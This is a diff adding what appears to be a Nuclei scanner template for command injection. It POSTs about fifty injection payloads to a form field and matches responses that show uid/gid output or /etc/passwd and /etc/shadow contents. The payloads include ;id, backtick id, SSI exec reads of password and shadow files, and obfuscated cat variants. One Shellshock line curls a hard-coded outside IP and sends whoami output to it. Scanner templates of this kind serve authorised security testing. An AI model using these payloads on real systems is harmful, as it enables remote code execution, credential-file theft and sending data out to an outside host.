@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%0aid"
+        - "%3Bid%7C"
+        - "`ping -i 30 127.0.0.1`"
+        - "||/usr/bin/id"
+        - "%60cat%2520%2Fetc%2Fpasswd%60"
+        - "cat$u+/etc$u/passwd$u"
+        - "a%3Bid"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+"
+        - "||cat+/etc/passwd+#"
+        - "||/usr/bin/id"
+        - "%27%20id"
+        - "%26%20id"
+        - "%27%20id"
+        - "\\nid|"
+        - "%7C%0Awhoami%0A%7C"
+        - "%26%20id"
+        - "%0a id %0a"
+        - "${PATH##*}"
+        - "%0Aid"
+        - "%3Bid"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "\\nid"
+        - "%26cat%20/etc/passwd"
+        - "%0Acat%2B%2Fetc%24u%2Fpasswd%24u"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "`id`"
+        - "%7C%0Awhoami%0A%7C"
+        - "|cat%20/etc/passwd"
+        - "%7Ccat%2520%2Fetc%2Fpasswd"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "`id`"
+        - "%3B%2Fusr%2Fbin%2Fid"
+        - "%3Cid%29"
+        - "cat `xxd -r -p <<< 2f6574632f706173737764`"
+        - "<id"
+        - "a;id"
+        - "%3B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd"
+        - "a);id"
+        - ";id"
+        - "%3Bcat%24u%2Fetc%24u%2Fpasswd%24u"
+        - "%27%0Aid"
+        - "%3Bid"
+        - "`id``"
+        - "cat%3C%2Fetc%24u%2Fpasswd"
+        - "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->"
+        - "%0Awhoami%0A"
+        - "%7Buname,-a%7D"
+        - "`id`"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=14?user=\\`whoami\\`\""
+        - "%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
